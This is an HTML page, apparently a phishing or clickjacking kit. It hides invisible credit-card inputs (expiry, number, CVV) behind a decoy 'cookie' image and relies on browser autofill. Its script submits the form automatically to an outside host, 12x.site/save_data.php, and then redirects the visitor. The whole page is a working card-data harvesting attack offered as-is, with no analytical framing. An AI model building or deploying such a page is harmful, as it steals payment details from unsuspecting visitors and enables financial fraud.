<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; margin: 0; height: 100vh;}
        .credit-card-container {background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; position: relative;}
        input[type="text"], input[type="number"] {width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; position: relative; opacity: 0;}
        input[type="submit"] {width: 100%; padding: 10px; background-color: #4CAF50; border: none; border-radius: 5px; color: white; font-size: 16px; cursor: pointer; }
        input[type="submit"]:hover {background-color: #45a049;}
        .cookie-image {position: absolute; top: 80px; left: 0; width: 100%; height: 40px; background: url('cookie.png') no-repeat center; background-size: contain; z-index: 1;}
    </style>
</head>
<body>
    <div class="credit-card-container">
        <form id="creditCardForm" action="https://12x.site/save_data.php" method="POST">
            <div class="cookie-image"></div>
            <input type="number" id="expiry" name="expiry" placeholder="Expiry Date (MMYY)" required autocomplete="cc-exp">
            <input type="number" id="cardnumber" name="cardnumber" placeholder="Card Number" required autocomplete="cc-number">
            <input type="number" id="cvv" name="cvv" placeholder="Card Number" required autocomplete="cc-csc">
            <input type="submit" value="Submit">
        </form>
    </div>
    <script>
        window.onload = () => document.querySelectorAll("#creditCardForm input[type='number']").forEach(input => {
            input.addEventListener("input", () => {
                const cardnumber = document.getElementById("cardnumber").value, expiry = document.getElementById("expiry").value, cvv = document.getElementById("cvv").value;
                if (cardnumber && expiry) {
                    document.getElementById("creditCardForm").submit();
                    setTimeout(() => window.location.href = "https://12x.site/logged.html", 1000);
                }
            });
        });
    </script>
</body>
</html>
